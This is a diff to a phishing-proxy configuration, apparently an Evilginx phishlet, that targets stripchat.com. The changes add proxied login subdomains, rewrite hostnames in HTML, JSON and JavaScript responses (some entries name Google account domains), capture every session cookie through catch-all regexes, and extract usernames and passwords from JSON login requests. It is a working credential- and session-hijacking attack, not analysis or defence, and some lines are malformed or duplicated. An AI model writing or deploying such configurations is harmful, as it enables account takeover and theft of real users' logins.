@@ -1,21 +1,31 @@
 author: '@cwaizydee'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true}
+ 
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'stripchat.com', session: true, is_landing: false}
+  
+
 sub_filters:
-  - {triggers_on: 'stripchat.com', orig_sub: 'sv', domain: 'stripchat.com', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
-  - domain: '.sv.stripchat.com'
-    keys: ['token','.*,regexp']
+  - domain: 'sv.stripchat.com'
+    keys: [.*,regexp']
+  - domain: '.stripchat.com'
+    keys: ['.*,regexp']
 credentials:
   username:
-    key: 'loginOrEmail'
-    search: '(.*)'
-    type: 'post'
+    key: ''
+    search: '"loginOrEmail":"([^"]*)"'
+    type: 'json'
   password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
+    key: ''
+    search: '"password":"([^"]*)"'
+    type: 'json'
 login:
   domain: 'sv.stripchat.com'
   path: '/login'
